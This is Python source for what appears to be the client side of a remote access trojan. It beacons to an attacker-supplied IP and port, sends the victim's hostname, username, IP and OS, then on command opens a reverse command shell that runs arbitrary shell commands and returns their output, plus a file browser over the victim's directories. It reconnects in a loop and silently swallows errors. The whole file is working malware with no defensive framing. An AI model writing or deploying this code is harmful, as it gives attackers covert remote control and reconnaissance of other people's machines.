import _thread
import os
import platform
import socket
import struct
import subprocess
import sys
import time

import psutil

from socketsr import *


def getInfo():
    hostname = socket.gethostname()
    username = os.environ.get("USERNAME")
    system = platform.platform()
    lanIp = socket.gethostbyname(socket.gethostname())

    return f'systeminfo:{hostname}:{username}:{lanIp}:{system}'


def getDiskInfo():
    diskList = ''
    for i in psutil.disk_partitions():
        diskList = diskList + i.device + '-'

    return diskList


def fileManager(fileManagerId):
    time.sleep(1)
    try:
        fileManagerClient = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        fileManagerClient.connect((ipaddress, port))
        data = f'fileManager:{fileManagerId}'
        # data = struct.pack('>I', len(data)) + data
        time.sleep(1)
        # clientCmd.send(data)
        sendData(fileManagerClient, data)
        while True:
            try:
                path = receiveData(fileManagerClient)
                if path is None:
                    break

                try:
                    dirs = os.listdir(path)
                    dirData = ''
                    for name in dirs:
                        currentPath = os.path.join(path, name)
                        fileSize = os.path.getsize(currentPath)
                        fileTime = os.path.getctime(currentPath)
                        if os.path.isfile(currentPath):
                            fileType = 'File'
                        else:
                            fileType = 'File Directory'

                        dirData += f'{name}/{fileTime}/{fileType}/{fileSize}\n'
                except Exception as e:
                    print(e)
                    dirData = str(e)


                sendData(fileManagerClient, dirData)

            except Exception as e:
                print(e)
                break

        fileManagerClient.close()

    except Exception as e:
        print(e)


def cmdClient(cmdId):
    time.sleep(1)
    try:
        clientCmd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        clientCmd.connect((ipaddress, port))
        data = f'cmdInfo:{cmdId}'
        # data = struct.pack('>I', len(data)) + data
        time.sleep(1)
        # clientCmd.send(data)
        sendData(clientCmd, data)
        while True:
            try:
                command = receiveData(clientCmd)
                # commandLen = recvAll(clientCmd, 4)
                if command is None:
                    break

                # commandLen = struct.unpack('>I', commandLen)[0]
                # command = recvAll(clientCmd, commandLen).decode('gbk')
                subp = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                subp_output, errors = subp.communicate()
                if subp_output:
                    sendData(clientCmd, subp_output)
                    # subp_output = struct.pack('>I', len(subp_output)) + subp_output
                    # clientCmd.send(subp_output)
                else:
                    # errors = struct.pack('>I', len(errors)) + errors
                    # clientCmd.send(errors)
                    sendData(clientCmd, errors)

            except Exception as e:
                clientCmd.close()
                print(e)
                break
        clientCmd.close()

    except Exception as e:
        print(e)


def main():
    systemInfo = getInfo()
    while True:
        time.sleep(2)
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((ipaddress, port))
            time.sleep(1)
            # systemInfo = struct.pack('>I', len(systemInfo)) + systemInfo

            # client.send(systemInfo)
            sendData(client, systemInfo)

            while True:
                # dateLen = recvAll(client, 4)
                # dateLen = struct.unpack('>I', dateLen)[0]
                # date = recvAll(client, dateLen)
                # date = str(date, encoding='gbk')
                data = receiveData(client)
                print(f'recv server date:{data}')

                if 'cmd' in data:
                    cmdId = data.split(':')[1]
                    if cmdId:
                        print(f'recv id:{cmdId}')
                        _thread.start_new_thread(cmdClient, (cmdId,))

                if 'fileManager' in data:
                    fileManagerId = data.split(':')[1]
                    if fileManagerId:
                        print(f'recv id:{fileManagerId}')
                        _thread.start_new_thread(fileManager, (fileManagerId,))
        except Exception as e:
            print(e)


if __name__ == "__main__":
    try:
        ipaddress = sys.argv[1]
        port = int(sys.argv[2])
        if ipaddress and port:
            main()
    except:
        pass
